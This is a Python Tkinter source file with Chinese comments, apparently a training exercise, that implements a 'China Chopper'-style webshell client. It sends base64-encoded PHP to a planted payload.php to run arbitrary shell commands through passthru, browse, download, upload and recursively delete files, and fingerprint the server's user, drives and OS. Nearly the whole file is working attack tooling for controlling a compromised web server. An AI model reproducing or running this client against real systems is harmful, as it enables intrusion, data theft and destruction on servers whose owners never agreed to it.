#!/usr/bin/env python
#coding:utf-8
from time import sleep
from tkinter import *
#tkinter 是Python内置的GUI工具的模块，各种控件都在其中定义
import requests
#requests是一个很实用的Python HTTP客户端库，编写爬虫和测试服务器响应数据时经常会用到。
#传递表单:r = requests.post('http://httpbin.org/post', data = {'key':'value'}),通常，你想要发送一些编码为表单形式的数据—非常像一个HTML表单。 要实现这个，只需简单地传递一个字典给 data 参数。你的数据字典 在发出请求时会自动编码为表单形式:

import base64
import tkinter.filedialog


header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0'}
url = "http://127.0.0.1/test/payload.php"
m_encode = "gbk"


class DirList:
    def __init__(self, initdir, diskinfo, usrinfo, osinfo):
        self.top = Tk()
        #生成主窗口
        self.top.title("zct-360college")
        self.label = Label(self.top, text='Python菜刀')
        #标签控件；可以显示文本和位图
        self.label.pack()
        # 将标签添加到主窗口(包装)

        self.label1 = Label(self.top, text=diskinfo)
        self.label1.pack()

        self.label2 = Label(self.top, text=usrinfo)
        self.label2.pack()

        self.label3 = Label(self.top, text=osinfo)
        self.label3.pack()

        self.cwd = StringVar(self.top)
        #tkinter.StringVar 能自动刷新的字符串变量

        self.dirl = Label(self.top, fg='blue', font=('Helvetica', 16, 'bold'))
        #foreground(fg)前景色；font字体；
        self.dirl.pack()

        self.dirfm = Frame(self.top)
        #在屏幕上创建一块矩形区域,多作为容器来布局窗体
        self.dirsb = Scrollbar(self.dirfm)
        self.dirsb.pack(side=RIGHT, fill=Y)
        self.dirs = Listbox(self.dirfm, height=15, width=100, yscrollcommand=self.dirsb.set)
        #Listbox,列表控件,可以含有一个或多个文本想,可单选也可多选
        # 把回调函数（setDirAndGo）和列表项绑定起来 双击列表项，就会执行setDirAndGo()
        self.dirs.bind('<Double-1>', self.setdirandgo)#Listbox与事件绑定,使用bind来指定回调函数,打印当前选中的值
        self.dirsb.config(command=self.dirs.yview)
        self.dirs.pack(side=LEFT, fill=BOTH)#fill=BOTH 当GUI窗体大小发生变化时，widget在X、Y两方向跟随GUI窗体变化
        self.dirfm.pack()

        # 创建文本框,让用户输入目录
        self.dirn = Entry(self.top, width=100, textvariable=self.cwd)
        # 按<return>键，就会执行doLS()
        self.dirn.bind('<Return>', self.dols)
        self.dirn.pack()

        # 在顶层文件中新建一个容器，并在容器中添加3个按键
        # 按键框架
        self.bfm = Frame(self.top)
        self.downloads = Button(self.bfm, text='下载', command=self.download, activeforeground='white',
                               activebackground='blue')
        self.uploads = Button(self.bfm, text='上传', command=self.upload, activeforeground='white',
                             activebackground='green')
        self.mkdirs = Button(self.bfm, text='新建文件夹', command=self.mkdir, activeforeground='white',
                            activebackground='pink')
        self.deletes = Button(self.bfm, text='删除', command=self.delete, activeforeground='red',
                             activebackground='pink')
        self.quits = Button(self.bfm, text='Quit', command=self.top.quit, activeforeground='white',
                           activebackground='red')

        self.downloads.pack(side=LEFT)
        self.uploads.pack(side=LEFT)
        self.mkdirs.pack(side=LEFT)
        self.quits.pack(side=LEFT)
        self.deletes.pack(side=LEFT)
        self.bfm.pack()

        # 创建文本框,让用户输入指令
        self.cmd = Entry(self.top, width=100)
        # 按<return>键，就会执行doLS()
        self.cmd.bind('<Return>', self.shell)
        self.cmd.pack()

        self.shell = Button(self.top, text='执行', command=self.shell, activeforeground='white',
                            activebackground='red')
        self.shell.pack(side="bottom")

        self.dirfm1 = Frame(self.top)
        self.dirsb1 = Scrollbar(self.dirfm1)
        self.dirsb1.pack(side=RIGHT, fill=Y)
        self.text = Text(self.dirfm1, height=30, width=100, yscrollcommand=self.dirsb1.set)
        self.dirsb1.config(command=self.text.yview)
        self.text.pack(side=LEFT, fill=BOTH)
        self.dirfm1.pack()

        if initdir is None:
            self.cwd.set("")
            self.dols()
        else:
            self.cwd.set(initdir)
            self.dols()

    def m_exec(self, ev=None):
        pass

    def delete(self, ev=None):
        check = self.dirs.get(self.dirs.curselection())
        #通过curselection函数获取当前的item index，然后通过get函数获取对应的选项名称。
        if not check:
            check = ""
        dirname = self.cwd.get() + "/" + check
        data = "function delete_directory($dirname){if (is_dir($dirname)) {$dir_handle = opendir($dirname);}if (!$dir_handle) {if(is_file($dirname)) {unlink($dirname);}return false;}while($file = readdir($dir_handle)) {if ($file != \".\" && $file != \"..\") {if (!is_dir($dirname.\"/\".$file)) {unlink($dirname.\"/\".$file);} else{delete_directory($dirname.\'/\'.$file);}}}closedir($dir_handle);rmdir($dirname);return true;}$dir = iconv(\"UTF-8\", \"GBK\", \""+dirname+"\");delete_directory($dir);"
        req = base64.b64encode(data.encode("gbk"))
        data = {'value': req.decode()}
        res = requests.post(url, headers=header, data=data)

    def mkdir(self, ev=None):
        dirname = "zct"
        data = "$dir = iconv(\"UTF-8\", \"GBK\", \"" + self.cwd.get() + "/" + dirname + "\");if(!file_exists($dir)){mkdir ($dir,0777,true);}"
        req = base64.b64encode(data.encode("gbk"))
        data = {'value': req.decode()}
        requests.post(url, headers=header, data=data)

    def upload(self, ev=None):
        filenames = tkinter.filedialog.askopenfilenames()
        filename = ""
        if len(filenames) != 0:
            string_filename = ""
            for i in range(0, len(filenames)):
                string_filename += str(filenames[i])
            filename = string_filename

        data = "$location =\"" + self.cwd.get() + "\";if($_FILES){print_r($_FILES);move_uploaded_file($_FILES[\"field\"][\"tmp_name\"],$location.$_FILES[\"field\"][\"name\"]);}"
        req = base64.b64encode(data.encode("gbk"))
        data = {'value': req.decode()}
        file = {"field": open(filename, "rb")}
        res = requests.post(url, headers=header, files=file, data=data)

    def shell(self, ev=None):
        self.text.delete(1.0, END)
        data = "echo passthru(\"" + self.cmd.get() + "\");"
        #passthru — 执行外部程序并且显示原始输出
        req = base64.b64encode(data.encode(m_encode))
        data = {'value': req.decode()}
        res = requests.post(url, headers=header, data=data)
        res.encoding = m_encode
        self.text.insert(INSERT, res.text)

    def download(self, ev=None):
        check = self.dirs.get(self.dirs.curselection())
        if not check:
            check = ""
        filepath = self.cwd.get() + "/" + check
        data = "$file_path = \"" + filepath +"\";$fp=fopen($file_path,\"r\");$file_size=filesize($file_path);$buffer=1024;$file_count=0;while(!feof($fp) && $file_count<$file_size) {$file_con=fread($fp,$buffer);echo $file_con;}fclose($fp);"
        req = base64.b64encode(data.encode(m_encode))
        data = {'value': req.decode()}
        res = requests.post(url, headers=header, data=data)
        file = open('C:/hack/'+check, 'wb')
        file.write(res.content)

    # 双击列表项时，就会执行此函数
    def setdirandgo(self, ev=None):
        self.last = self.cwd.get()
        #StringVar().get()获取文本框中的值
        #self.dirs.config(selectbackground='#89cff0')
        # 检查当前选中的是否是文件夹
        check = self.dirs.get(self.dirs.curselection())#curselection()返回当前所选项目的索引
        if not check:
            check = ""
        self.cwd.set(self.last+"/"+check)
        self.dols()

    def dols(self, ev=None):
        error = ''
        tdir = self.cwd.get()
        req_h = "$dirname=\""
        req_e = "\";if(is_dir($dirname)){$dir=opendir($dirname);$file=\"\";while ($file=readdir($dir)){print $file.\"\n\";}closedir($dir);}else{print \"not a dir\";}"
        req = req_h + tdir + req_e
        req = base64.b64encode(req.encode(m_encode))
        data = {'value': req.decode()}
        res = requests.post(url, headers=header, data=data)
        res.encoding = m_encode

        #非目录或不存在此文件
        if res.text == "not a dir":
            self.cwd.set(error)
            self.top.update()
            sleep(0.5)
            if not (hasattr(self, 'last') and self.last):
                self.last = tdir
            self.cwd.set(self.last)
            self.dirs.config(selectbackground='red')
            self.top.update()
            return
        self.dirs.delete(0, END)
        self.cwd.set('正读取文件夹...')
        self.top.update()
        for eachFile in res.text.split("\n")[:-1]:
            self.dirs.insert(END, eachFile)
        self.cwd.set(tdir)
        self.dirs.config(selectbackground='Blue')


def main():
    # 获取目标服务web目录
    data = {'value': 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pO2VjaG8gJEQ7ZWNobygifDwtIik7aWYoc3Vic3RyKCRELDAsMSkhPSIvIikge2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpIGlmKGlzX2RpcigieyRMfToiKSkgJFIuPSJ7JEx9OiI7fWVjaG8oIi0+fCIpO2VjaG8gJFI7ZWNobygifDwtIik7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTtlY2hvKCItPnwiKTtlY2hvICR1c3I7ZWNobygifDwtIik7ZWNobygiLT58Iik7ZWNobyBwaHBfdW5hbWUoKTtlY2hvKCJ8PC0iKTtkaWUoKTsK'}
    res = requests.post(url, headers=header, data=data)
    res.encoding = m_encode
    matchObj = re.search(r'->\|(.*?)\|<-->\|(.*?)\|<-->\|(.*?)\|<-->\|(.*?)\|<-', res.text)

    #data中的PHP语句:
    # @ini_set("display_errors", "0");
    # @set_time_limit(0);
    # @set_magic_quotes_runtime(0);
    #
    # echo("->|");
    # $D = dirname($_SERVER["SCRIPT_FILENAME"]);if ($D == "")$D=dirname($_SERVER["PATH_TRANSLATED"]);echo $D;
    # echo("|<-");
    #
    # if (substr($D, 0, 1) != "/") {foreach(range("A", "Z") as $L) if (is_dir("{$L}:")) $R.="{$L}:";}
    # echo("->|");
    # echo $R;
    # echo("|<-");
    #
    # $u = (function_exists('posix_getegid'))?@posix_getpwuid( @posix_geteuid() ):'';$usr = ($u)?$u['name']:@get_current_user();
    # echo("->|");
    # echo $usr;
    # echo("|<-");
    #
    # echo("->|");
    # echo php_uname();
    # echo("|<-");
    # die();
    initdir = matchObj.group(1)
    #匹配到的PHP语句:$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);echo $D;
    #$_SERVER[‘SCRIPT_FILENAME’]获取的是当前运行脚本名称，不管$_SERVER[‘SCRIPT_FILENAME’]是在被包含的文件里面还是在当前执行脚本文件里面，运行的结果不会发生任何变化
    diskinfo = matchObj.group(2)
    #匹配到的PHP语句:echo $R; 从if (substr($D, 0, 1) != "/") {foreach(range("A", "Z") as $L) if (is_dir("{$L}:")) $R.="{$L}:";}可以看出$R是显示当前目录的盘符
    usrinfo = matchObj.group(3)
    # 匹配到的PHP语句:echo $usr;从$u = (function_exists('posix_getegid'))?@posix_getpwuid( @posix_geteuid() ):'';$usr = ($u)?$u['name']:@get_current_user();可以看出$usr是显示当前的用户
    osinfo = matchObj.group(4)
    # 匹配echo php_uname();获取系统类型及版本号

    d = DirList(initdir, diskinfo, usrinfo, osinfo)
    mainloop()
    #进入消息循环（必需组件）


if __name__ == '__main__':
    main()
